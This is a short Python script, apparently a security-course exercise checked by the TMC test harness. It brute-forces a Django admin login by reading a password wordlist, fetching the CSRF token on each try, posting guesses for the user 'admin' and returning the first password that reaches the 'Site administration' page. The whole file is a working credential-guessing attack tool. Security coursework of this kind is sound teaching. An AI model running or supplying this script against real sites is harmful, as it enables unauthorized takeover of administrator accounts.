import sys
import requests
import bs4 as bs

def extract_token(response):
	soup = bs.BeautifulSoup(response.text, 'html.parser')
	for i in soup.form.findChildren('input'):
		if i.get('name') == 'csrfmiddlewaretoken':
			return i.get('value')
	return None
	

def isloggedin(response):
	soup = bs.BeautifulSoup(response.text, 'html.parser')
	return soup.title.text.startswith('Site administration')


def test_password(address, candidate):
    url = f'{address}/admin/login/?next=/admin/'
    session = requests.Session()
    
    for password in candidate:
        login_page_response = session.get(url)
        csrf_token = extract_token(login_page_response)
        
        payload = {
            'csrfmiddlewaretoken': csrf_token,
            'username': 'admin',
            'password': password
        }
        
        if isloggedin(session.post(url, data=payload, headers={'Referer':url})):
            return password
    return None


def main(argv):
	address = sys.argv[1]
	fname = sys.argv[2]
	candidates = [p.strip() for p in open(fname)]
	print(test_password(address, candidates))


# This makes sure the main function is not called immediatedly
# when TMC imports this module
if __name__ == "__main__": 
	if len(sys.argv) != 3:
		print('usage: python %s address filename' % sys.argv[0])
	else:
		main(sys.argv)
